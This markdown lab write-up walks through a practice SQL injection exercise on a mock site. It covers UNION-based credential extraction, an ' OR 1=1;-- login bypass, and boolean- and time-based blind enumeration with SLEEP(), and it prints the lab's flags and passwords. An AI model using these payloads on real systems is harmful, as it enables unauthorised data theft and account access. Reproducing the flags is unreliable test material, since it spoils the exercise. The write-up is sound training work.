# [SQL-Injection-Introduction.md - Practical Lab](https://github.com/angeline-infosec/notes/blob/main/Web/SQL-Injection-Introduction.md)


## Task 9: Practical-SQL Injection 


## Level 1: Union-Based SQLi (In-Band)

What you see:  A mock browser at https://website.thm/article?id=1 showing a blog article titled "My First Article". The SQL Query box shows:

  ``` select * from article where id = 1 ```

<img width="1917" height="923" alt="image" src="https://github.com/user-attachments/assets/fc4068a3-b421-47c2-9f32-15eb361fdeaf" />


### Step 1: Find the column count. Change the id value in the URL bar:

  ``` 1 UNION SELECT 1 ```
              
<img width="1917" height="927" alt="image" src="https://github.com/user-attachments/assets/c31bc80f-adc3-4608-a62b-9d8927c1b0a6" />

Error. Wrong number of columns. Try two:

  ``` 1 UNION SELECT 1,2 ```

<img width="1917" height="922" alt="image" src="https://github.com/user-attachments/assets/29907f6d-b63e-4880-8ce4-535ee8082760" />


Still an error. Try three:

``` 1 UNION SELECT 1,2,3 ```


<img width="1917" height="925" alt="image" src="https://github.com/user-attachments/assets/3c3090f5-24ab-414d-8be9-c03f5492ab0e" />


No error, and the article loads. This means the article table has 3 columns. This is the UNION rule from Task 2: both SELECT statements must return the same number of columns. The database rejects anything that does not match, which is why each wrong guess gives you an error.

### Step 2: Make your UNION output visible. Set the article ID to 0 so the original query returns nothing:

``` 0 UNION SELECT 1,2,3 ```

<img width="1917" height="927" alt="image" src="https://github.com/user-attachments/assets/71590dec-f4f6-4967-8ce1-ec1ac4e89fe9" />


With a valid ID like 1, the legitimate article row fills the page, and our injected row gets pushed aside. Setting it to 0 returns no real article, so only our UNION output renders. The values 1, 2, and 3 appear on the page.3 shows up in the content area, which is the column we will use for extraction.

### Step 3: Get the database name.

``` 0 UNION SELECT 1,2,database() ```

<img width="1917" height="927" alt="image" src="https://github.com/user-attachments/assets/2f36bf35-fd45-4c4e-beeb-c0fc50034769" />


database() is a MySQL function that returns the name of the current database. The content area shows that the current database is sqli_one.

### Step 4: List tables.


``` 0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one' ```

<img width="1917" height="926" alt="image" src="https://github.com/user-attachments/assets/34510951-2e30-4d05-8442-d09470961ae5" />


information_schema is the database's own catalogue, covered in Task 2. It holds the names of every table in every database on the server. group_concat() concatenates all results into a single string so they fit in the single column we have available. You can now see the tables, including staff_users.

### Step 5: List columns in the target table.


``` 0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users' ```

<img width="1912" height="920" alt="image" src="https://github.com/user-attachments/assets/c1bed9da-57df-4d08-b454-008b6b873d2a" />


This reveals the columns: id, password, and username.

### Step 6: Extract credentials.

``` 0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users ```

<img width="1917" height="923" alt="image" src="https://github.com/user-attachments/assets/ea452eca-2914-44a3-843e-90e99981fd9c" />


All usernames and passwords appear on the page. Find Martin's password and enter it in the Answer box.

Click Check Password to find the first flag. 

### Flag: THM{SQL_INJECTION_3840}


## Level 2: Authentication Bypass

<img width="1917" height="921" alt="image" src="https://github.com/user-attachments/assets/39a065d5-1932-492d-ae84-aaaf63941d60" />


What you see: A login form at https://website.thm/login. 

The SQL Query box shows:

``` select * from users where username='' and password='' LIMIT 1; ```


The app checks whether this query returns a row. If it does, you are in. It never shows you the data; it just shows success or failure. That makes this Blind SQLi: the injection works, but the results aren't visible on the page.

The payload. In the Username field, enter ``` ' OR 1=1;-- ``` and put anything in the Password field. 


<img width="1917" height="917" alt="image" src="https://github.com/user-attachments/assets/795cd43a-1244-41e3-86a4-d7e19372075d" />


The server builds:


``` select * from users where username='' OR 1=1;--' and password='anything' LIMIT 1; ```

Let's break it down:

```username=''``` does not match any user
```OR 1=1``` is always true, so the entire ```WHERE``` clause evaluates to true
```;--``` ends the statement and comments out everything after it, including the ```and password=``` check
The database returns every row. The app sees rows and logs you in as the first user
The password field is irrelevant because ```--``` removes it from the query before the database ever evaluates it.

Click Login. You will see a message confirming the bypass. Click Level 3 to find the second flag,

### Flag: THM{SQL_INJECTION_9581}


## Level 3: Boolean-Based Blind SQLi

What you see: Two mock browsers:

<img width="1917" height="922" alt="image" src="https://github.com/user-attachments/assets/e2a2a5d7-62f8-4300-972d-b94d9d83b30e" />


Top: A checkuser API at https://website.thm/checkuser?username=admin returning ```{"taken":true}```.
Bottom:  A login form for the credentials you are about to discover.

If you execute the query in the Top browser, the SQL Query box shows:

<img width="1917" height="927" alt="image" src="https://github.com/user-attachments/assets/bbd1291e-096d-45c0-84b3-6e7fcf5c1165" />


``` select * from users where username = '%username%' LIMIT 1; ```

The page output contains no data. Your only feedback is ```{"taken":true}``` or ```{"taken":false}```. That binary signal is all you need. You use it to ask the database yes/no questions and extract content one character at a time.

### Step 1: Confirm injection.

``` admin123' UNION SELECT 1,2,3 where database() like '%';-- ```

<img width="1917" height="922" alt="image" src="https://github.com/user-attachments/assets/d733b3d4-678f-45e3-b365-3524279e253e" />


```%``` is a wildcard that matches anything, so this condition is always true. Response: ```{"taken":true}```. Injection is confirmed and working.

### Step 2: Get the database name, letter by letter.


``` admin123' UNION SELECT 1,2,3 where database() like 'a%';-- ```

<img width="1917" height="926" alt="image" src="https://github.com/user-attachments/assets/92dcf570-811e-4f71-b27d-3ed563dd95a4" />


This returns ```{"taken":false}```. Not 'a'. Try ```s%```:

``` admin123' UNION SELECT 1,2,3 where database() like 's%';-- ```


<img width="1916" height="922" alt="image" src="https://github.com/user-attachments/assets/15b77b90-ebc7-4d3a-8d40-e6c4bc955dfc" />


This returns ```{"taken":true}```. First letter is s. 
Fix that and test the second character:

``` admin123' UNION SELECT 1,2,3 where database() like 'sa%';--   {"taken":false}```


<img width="1916" height="917" alt="image" src="https://github.com/user-attachments/assets/9499a4ee-4eb2-424a-b963-8e2399587acb" />


```admin123' UNION SELECT 1,2,3 where database() like 'sq%';--   {"taken":true}```


<img width="1917" height="927" alt="image" src="https://github.com/user-attachments/assets/6d395e47-eb91-405e-ad9b-e4dcf390bc45" />


```
Keep narrowing: 
sqla%
 (false),
sqli%
 (true),
sqli_%
 (true),
sqli_t%
 (false),
sqli_th%
 (false),
sqli_thr%
 (false), and so on. This reveals that the full database name is 
sqli_three
.
```

### Step 3: Find table names.

Now query ```information_schema.tables``` the same way, but test table names instead:


```admin123' UNION SELECT 1,2,3 FROM information_schema.tables WHERE table_schema = 'sqli_three' and table_name like 'u%';--```

<img width="1917" height="922" alt="image" src="https://github.com/user-attachments/assets/5d6eb796-9723-4755-b770-67ea6d366125" />


```{"taken":true}```. Something starts with 'u'. Keep going: ```us%``` (true),```use%``` (true),```user%``` (true), users with no wildcard (true). Now you know the table name: users.


<img width="1917" height="925" alt="image" src="https://github.com/user-attachments/assets/c9586a22-5d9e-4764-a800-efa90fde427c" />


### Step 4: Get column names.


``` admin123' UNION SELECT 1,2,3 FROM information_schema.columns WHERE table_name = 'users' and column_name like 'u%';-- ```

Column named %username%:

<img width="1917" height="927" alt="image" src="https://github.com/user-attachments/assets/0b612ff3-b90b-4d6c-9af1-169398a3440d" />


Column named %password%:


<img width="1917" height="928" alt="image" src="https://github.com/user-attachments/assets/e96fd2fe-5556-4a01-b56a-ddd37f9b5e6b" />


Work through each column you want to enumerate. You find the columns username and password.

### Step 5: Extract the username.

```admin123' UNION SELECT 1,2,3 from users where username like 'a%';--```

```{"taken":true}```. Keep going: ```ad%```, ```adm%```, ```admi%```, ```admin``` with no wildcard (true). You’ve now got the username: admin

<img width="1917" height="921" alt="image" src="https://github.com/user-attachments/assets/ec2f916e-1fa2-430b-9319-6ab64a115896" />


### Step 6: Extract the password.

```admin123' UNION SELECT 1,2,3 from users where username='admin' and password like '3%';--```


<img width="1917" height="926" alt="image" src="https://github.com/user-attachments/assets/24828c67-73a1-420e-adb2-4b5a5f7279ca" />


Work through the same way. The password is 3845.

### Step 7: Log in

Enter admin and 3845 in the bottom form. Click Login to find the third flag and get to Level 4.

### Flag: THM{SQL_INJECTION_1093}


## Level 4: Time-Based Blind SQLi

<img width="1917" height="923" alt="image" src="https://github.com/user-attachments/assets/4319f063-35a0-40f9-b5ef-a98ef96eed93" />


What you see:  Similar setup to Level 3, but the injection point is the Referrer HTTP header. More importantly, the response looks completely identical whether a condition is true or false. There is nothing to read on the page. Your only signal is whether the response takes longer to arrive.

### Step 1: Find the column count.


```admin123' UNION SELECT SLEEP(5);--```

<img width="1917" height="927" alt="image" src="https://github.com/user-attachments/assets/2650d71e-bffb-4726-b52b-06c8e9d6dd4b" />


Response comes back immediately, wrong column count. 

Try two:


```admin123' UNION SELECT SLEEP(5),2;--```

<img width="1917" height="926" alt="image" src="https://github.com/user-attachments/assets/b194be1b-f31c-4aff-8c15-a938f71e9c07" />


A 5-second pause before the response arrives. The table has 2 columns. The SLEEP() only runs when the UNION column count is correct, so the delay itself confirms both the injection and the column count.

### Step 2: Get the database name.

Same character-by-character method as Level 3, but now you watch the clock instead of the response body. 

A 5-second delay means the condition is true. An immediate response means false.

Start with the first character:
```admin123' UNION SELECT SLEEP(5),2 where database() like 's%';--```

<img width="1917" height="926" alt="image" src="https://github.com/user-attachments/assets/7c6a18bd-d42d-43f9-8505-9c7b6e5b96fd" />


5-second delay. The database name starts with s. 

Fix that letter and test the second:


```admin123' UNION SELECT SLEEP(5),2 where database() like 'sq%';--```

Another delay. The second letter is q. Keep going the same way:


```admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli%';--```

<img width="1917" height="928" alt="image" src="https://github.com/user-attachments/assets/5142ca09-90c9-4d49-85ba-ff8030977f74" />


Delay. Then sqli_:


```admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_f%';--```

Delay. Then sqli_fo%,sqli_fou%, each one giving a delay until you arrive at the full name with no wildcard:


```admin123' UNION SELECT SLEEP(5),2 where database() like 'sqli_four';--```

<img width="1917" height="930" alt="image" src="https://github.com/user-attachments/assets/9c8cfff0-fdfb-4ee3-aeb9-ee3810c53978" />


Delay again, and this time there is no % at the end, which confirms you have the complete name. The database name is sqli_four.

### Step 3: Enumerate tables and columns.

Same flow as Level 3, but every condition check uses SLEEP(). Query information_schema.tables for table names and information_schema.columns for column names. A delay means the character matches; immediate means it does not.

```admin123' UNION SELECT SLEEP(5),2 FROM information_schema.tables WHERE table_schema = 'sqli_four' and table_name like 'u%';--```

<img width="1911" height="905" alt="image" src="https://github.com/user-attachments/assets/5786972c-df1c-437a-b12f-bedf7327f903" />


Work through to find the users table, then enumerate its columns the same way.


<img width="1917" height="902" alt="image" src="https://github.com/user-attachments/assets/6f2341e0-7a24-4dad-84eb-bfd5c23ae575" />


### Step 4: Extract the admin password.

```admin123' UNION SELECT SLEEP(3),2 from users where username='admin' and password like '4%';--```

<img width="1917" height="931" alt="image" src="https://github.com/user-attachments/assets/d8535ee7-4fed-44c4-a8dc-652b513048a8" />


3-second delay: first character is 4. Then```49%``` (delay),```496%``` (delay),```4961%``` (delay),```4961``` with no wildcard (delay). 

You now have the password: ```4961```.


This level takes a while. Every character needs multiple requests, and every true condition means sitting through the sleep timer. That is time-based blind SQLi. It is the slowest technique here, but it works when there is nothing else to read from the response.


### Step 5: Log in

Enter ```admin``` and ```4961``` in the login form and click Login to get the final flag.


<img width="1912" height="806" alt="image" src="https://github.com/user-attachments/assets/fe7eb2f1-6987-484d-acf1-2fb965be0c14" />


### Flag: THM{SQL_INJECTION_MASTER}

Take a moment to think about what you actually did here. You extracted a full set of credentials without the application ever returning a single byte of database content. No data in the page, no error messages, no boolean signal to read. Every digit of that password came from watching whether a response took 3 seconds or arrived immediately, repeated across dozens of requests.

That is the core of time-based blind SQLi: you never read the data, you deduce it. The database does the work, and the clock tells you the answer. In a real engagement, you would use SQLmap to automate character enumeration rather than testing by hand. But doing it manually once makes clear why the technique works and where it can break, which matters when you need to adjust your approach against a target that blocks or rate-limits automated tools.
